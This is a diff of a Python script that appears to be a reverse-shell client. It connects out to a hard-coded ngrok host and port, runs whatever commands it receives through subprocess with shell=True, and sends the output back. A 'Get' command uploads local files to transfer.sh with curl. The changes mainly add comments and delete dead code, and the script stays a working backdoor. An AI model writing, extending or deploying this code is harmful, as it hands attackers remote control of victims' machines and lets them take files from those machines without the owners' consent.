@@ -10,13 +10,10 @@ import subprocess as sp
 host = '0.tcp.ngrok.io'
 port = 13862
 headerLength = 100
-# os.system('clear')
 
-# recive msg for variable length
+# recive msg of variable length
 def recv(serv):
-    # msg = "-"
     msg = serv.recv(headerLength).decode()
-    # msg += '-'
     n = int(msg)
     msg = serv.recv(n).decode()
     return msg
@@ -27,16 +24,6 @@ def send(serv, msg):
     msg = f'{len(str(msg)):<{headerLength}}{msg}'
     serv.send(msg.encode())
 
-
-# to remove flags and get input
-# def fetchResults(cmd):
-#     return re.split(r' -[\w]* ', cmd)[1:]
-
-
-
-
-
-
 # start
 try:
     serv = socket.socket()
@@ -44,8 +31,10 @@ try:
     while True:
         msg = recv(serv)
         op = ''
+        # to exit
         if msg == 'exit':
             continue
+        # to change dir
         elif re.match(r"^(sudo\s)?cd .*$", msg):
             try:
                 os.chdir(msg[3:])
@@ -61,19 +50,21 @@ try:
         elif (msg == 'hello'):
             send(serv, name)
             continue
+        # to get the file from client
         elif re.match(r'^Get .*',msg):
             cmd = "curl -T"+msg[4:]+" --silent -L transfer.sh/"+msg[4:]
             op = sp.check_output(cmd, shell=True).decode()
+        # forany linux/unix based command
         else:
             try:
                 op = sp.check_output(msg, shell=True).decode()
             except Exception as e:
                 op = 'Invalid Command'
-
+        # if command is executing backgroud or have no output 
         if op == '':
             op = 'Command Executed'
-
-        # serv.send(op)
+        # send output to server
         send(serv, op)
 finally:
+    # close client server
     serv.close()
